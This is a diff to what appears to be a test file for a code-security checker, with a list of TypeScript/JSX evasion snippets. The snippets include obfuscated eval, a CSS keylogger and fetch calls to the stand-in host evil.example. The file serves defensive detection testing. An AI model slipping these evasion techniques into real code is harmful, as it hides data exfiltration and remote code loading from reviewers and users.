@@ -40,13 +40,13 @@ const attacks: Record<string, string> = {
   'meta refresh with dynamic http-equiv': `const H = 'ref' + 'resh'; export const C = () => <meta httpEquiv={H} content="0;url=https://evil.example" />;`,
   'setAttribute onload': `export const f = (el: Element) => el.setAttribute('on' + 'load', 'alert(1)');`,
   'setAttribute src': `export const f = (el: Element) => el.setAttribute('src', 'https://evil.example/x.js');`,
-  'insertAdjacentHTML': `export const f = (el: Element, s: string) => el.insertAdjacentHTML('beforeend', s);`,
+  insertAdjacentHTML: `export const f = (el: Element, s: string) => el.insertAdjacentHTML('beforeend', s);`,
   'outerHTML through computed key': `export const f = (el: any, s: string) => { el['outer' + 'HTML'] = s; };`,
   'polymorphic tag set to script': `export const C = ({ as: Tag = 'div' }: any) => <Tag />; export const D = () => <C as="script" />;`,
   'Function via constructor property': `export const f = () => (() => {}).constructor('return 1')();`,
   'eval through globalThis computed': `(globalThis as any)[String.fromCharCode(101, 118, 97, 108)]('1');`,
   'Reflect.apply on fetch': `Reflect.apply(fetch, window, ['https://evil.example']);`,
-  'WebAssembly': `WebAssembly.instantiate(new Uint8Array([0]));`,
+  WebAssembly: `WebAssembly.instantiate(new Uint8Array([0]));`,
   'service worker via computed key': `(navigator as any)['service' + 'Worker'].register('/x.js');`,
   'URL in an object constant': `const CFG = { api: 'https://evil.example' }; fetch(CFG.api + '/x');`,
   'URL returned by a function': `const api = () => 'https://evil.example/x'; fetch(api());`,
@@ -58,7 +58,8 @@ const attacks: Record<string, string> = {
   'Request object': `fetch(new Request('https://evil.example/x'));`,
   'eval in a type-looking position': `export const x: typeof eval = eval;`,
   'CSS keylogger in a <style> element': `export const C = () => <style>{'input[value^="a"] { background: url(https://evil.example/a); }'}</style>;`,
-  'external @import in styled-jsx': 'export const C = () => <style jsx global>{`@import url("https://evil.example/x.css");`}</style>;',
+  'external @import in styled-jsx':
+    'export const C = () => <style jsx global>{`@import url("https://evil.example/x.css");`}</style>;',
   'escaped identifier fetch': `\\u0066etch('https://evil.example');`,
 };
 
